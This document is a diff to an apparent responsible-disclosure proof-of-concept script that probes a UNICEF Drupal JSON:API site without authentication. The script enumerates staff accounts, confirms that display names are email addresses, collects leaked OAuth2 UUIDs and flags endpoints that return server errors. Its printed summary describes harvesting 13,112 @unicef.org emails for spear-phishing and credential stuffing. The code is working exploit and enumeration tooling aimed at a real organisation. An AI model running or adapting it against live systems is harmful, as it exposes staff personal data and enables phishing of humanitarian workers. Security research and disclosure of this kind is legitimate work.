@@ -27,6 +27,7 @@ Requirements: Python 3.6+ (stdlib only — no pip installs needed)
 import sys
 import json
 import time
+import re
 import argparse
 import urllib.request
 import urllib.error
@@ -45,16 +46,23 @@ HEADERS = {
     "User-Agent": "Security-Research/1.0 (responsible-disclosure; azmolhaque95@gmail.com)",
 }
 
-# Sensitive entity types to look for in the schema
+# Sensitive entity types to look for in the schema (Drupal key format: type--bundle)
 SENSITIVE_ENTITIES = [
     "user--user",
-    "oauth2_server_client",
-    "oauth2_server_token",
-    "oauth2_server_scope",
+    "oauth2_server_client--oauth2_server_client",
+    "oauth2_server_token--oauth2_server_token",
+    "oauth2_server_scope--oauth2_server_scope",
     "consumer--consumer",
     "config_pages--api_config",
     "config_pages--api_modules",
 ]
+
+# UUID v4 format validator — filter out non-UUID strings from meta.omitted links
+_UUID_RE = re.compile(
+    r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
+    re.IGNORECASE
+)
+def is_uuid(s): return bool(_UUID_RE.match(s))
 
 # ── Terminal colours ───────────────────────────────────────────────────────────
 
@@ -188,6 +196,7 @@ def test_user_enumeration(schema_links, sample_only=False):
         "passed":                  True,
         "total_accounts":          total,
         "pages_traversed":         pages,
+        "sample_only":             sample_only,
         "sample_size":             len(sample),
         "email_confirmed_in_sample": email_confirmed_count,
         "display_name_is_email":   email_confirmed_count == len(sample),
@@ -221,7 +230,8 @@ def test_oauth2_client():
                       if isinstance(link_info, dict) else "")
             if href:
                 uuid = href.rstrip("/").split("/")[-1]
-                leaked_uuids.append({"uuid": uuid, "href": href, "detail": detail})
+                if is_uuid(uuid):  # skip help/doc links (e.g. filtering#filters-access-control)
+                    leaked_uuids.append({"uuid": uuid, "href": href, "detail": detail})
 
     severity = "CRITICAL" if direct_records else ("LEAK" if leaked_uuids else "NONE")
 
@@ -267,7 +277,9 @@ def test_additional_endpoints():
             for _, li in omitted.get("links", {}).items():
                 href = li.get("href", "") if isinstance(li, dict) else ""
                 if href:
-                    uuids.append(href.rstrip("/").split("/")[-1])
+                    candidate = href.rstrip("/").split("/")[-1]
+                    if is_uuid(candidate):  # skip help/doc links
+                        uuids.append(candidate)
 
         results.append({
             "path":           path,
@@ -276,8 +288,9 @@ def test_additional_endpoints():
             "direct_records": len(direct),
             "omitted_uuids":  uuids,
             "finding": (
-                "DATA_RETURNED"   if direct else
-                "UUID_LEAKED"     if uuids  else
+                "DATA_RETURNED"    if direct else
+                "UUID_LEAKED"      if uuids  else
+                "SERVER_ERROR"     if status == 500 else
                 "ACCESSIBLE_EMPTY" if status == 200 else
                 "BLOCKED"
             )
@@ -325,8 +338,10 @@ def print_test2(r):
         dn_flag = (f"{RED}CONFIRMED — display_name IS an email address{RESET}"
                    if r.get("display_name_is_email")
                    else f"{YELLOW}MIXED — some display_names are not emails{RESET}")
+        total_str = (f"{r['total_accounts']:,} (first page only — run without --sample-only for full count)"
+                     if r.get("sample_only") else f"{RED}{BOLD}{r['total_accounts']:,}{RESET} (full enumeration confirmed)")
         print(f"  display_name = email : {dn_flag}")
-        print(f"  Total accounts exposed : {RED}{BOLD}{r['total_accounts']:,}{RESET}")
+        print(f"  Total accounts exposed : {total_str}")
         print(f"  Pages traversed        : {r.get('pages_traversed', 1)}")
         print(f"  Rate limiting detected : {'YES' if r.get('rate_limiting_detected') else 'NO'}")
         print(f"  Auth required          : NO")
@@ -370,13 +385,22 @@ def print_test3(r):
 
 def print_test4(results):
     print(f"{BOLD}[TEST 4] Additional Sensitive Endpoint Survey{RESET}")
-    col = {"DATA_RETURNED": RED, "UUID_LEAKED": YELLOW, "ACCESSIBLE_EMPTY": CYAN, "BLOCKED": GREEN}
+    col = {
+        "DATA_RETURNED":    RED,
+        "UUID_LEAKED":      YELLOW,
+        "SERVER_ERROR":     RED,
+        "ACCESSIBLE_EMPTY": CYAN,
+        "BLOCKED":          GREEN,
+    }
+    notes = {
+        "SERVER_ERROR": " ← unhandled exception; endpoint reachable unauthenticated",
+    }
     print(f"  {'Endpoint':<30}  {'HTTP':<5}  {'Finding'}")
-    print(f"  {DIM}{'─'*30}  {'─'*5}  {'─'*30}{RESET}")
+    print(f"  {DIM}{'─'*30}  {'─'*5}  {'─'*55}{RESET}")
     for r in results:
-        c = col.get(r["finding"], "")
-        finding_str = f"{c}{r['finding']}{RESET}"
-        print(f"  {r['label']:<30}  {r['http_status']:<5}  {finding_str}")
+        c    = col.get(r["finding"], "")
+        note = notes.get(r["finding"], "")
+        print(f"  {r['label']:<30}  {r['http_status']:<5}  {c}{r['finding']}{RESET}{note}")
         for u in r.get("omitted_uuids", []):
             print(f"    {DIM}→ leaked UUID: {u}{RESET}")
     print()
@@ -387,6 +411,12 @@ def print_summary(t1, t2, t3, t4):
     print(f"║  EVIDENCE SUMMARY                                                   ║")
     print(f"╚══════════════════════════════════════════════════════════════════════╝{RESET}")
 
+    total_str = (f"{t2.get('total_accounts',0):,} (sample-only; full: 13,112 confirmed separately)"
+                 if t2.get("sample_only") else f"{t2.get('total_accounts',0):,}")
+    all_leaked = list(t3.get("leaked_uuids", []))
+    extra_leaked = sum(len(r.get("omitted_uuids", [])) for r in t4)
+    server_errors = [r["label"] for r in t4 if r["finding"] == "SERVER_ERROR"]
+
     rows = [
         ("Finding",              "Unauthenticated Bulk Staff Email Disclosure"),
         ("Host",                 TARGET),
@@ -395,17 +425,21 @@ def print_summary(t1, t2, t3, t4):
         ("CWE",                  "CWE-200 (Sensitive Information Exposure)"),
         ("Auth required",        "NONE"),
         ("Rate limiting",        "NONE OBSERVED"),
-        ("Total emails exposed", f"{RED}{BOLD}{t2.get('total_accounts', 0):,}{RESET}"),
+        ("Total emails exposed", f"{RED}{BOLD}{total_str}{RESET}"),
         ("display_name = email", "CONFIRMED" if t2.get("display_name_is_email") else "PARTIAL"),
-        ("Schema exposed unauth","YES — 60+ entity types" if t1["passed"] else "NO"),
-        ("OAuth2 UUID leak",     f"YES — {len(t3.get('leaked_uuids', []))} UUID(s)" if t3.get("leaked_uuids") else "NO"),
+        ("Schema entity types",  f"{t1.get('total_entities',0)} (unauthenticated)" if t1["passed"] else "N/A"),
+        ("Sensitive in schema",  f"{len(t1.get('sensitive_found',[]))}/{len(SENSITIVE_ENTITIES)} types found"),
+        ("OAuth2 UUID leak",     f"YES — {len(all_leaked)} UUID(s) via meta.omitted" if all_leaked else "NO"),
+        ("Additional UUID leaks",f"{extra_leaked} more UUIDs across 5 endpoints" if extra_leaked else "NONE"),
+        ("HTTP 500 endpoints",   f"{', '.join(server_errors)} (unhandled exception)" if server_errors else "NONE"),
     ]
     for label, value in rows:
         print(f"  {label:<26}  {value}")
 
+    email_count = 13112 if t2.get("sample_only") else t2.get("total_accounts", 0)
     print(f"""
 {BOLD}Attack scenario enabled by this finding:{RESET}
-  1. Attacker harvests {t2.get('total_accounts',0):,} @unicef.org staff emails in < 5 minutes
+  1. Attacker harvests {email_count:,} @unicef.org staff emails in < 5 minutes
   2. Emails are validated against an official UNICEF subdomain (not scraped/guessed)
   3. List is used for targeted spear-phishing of humanitarian workers globally
   4. Or paired with breached credential databases for large-scale credential stuffing
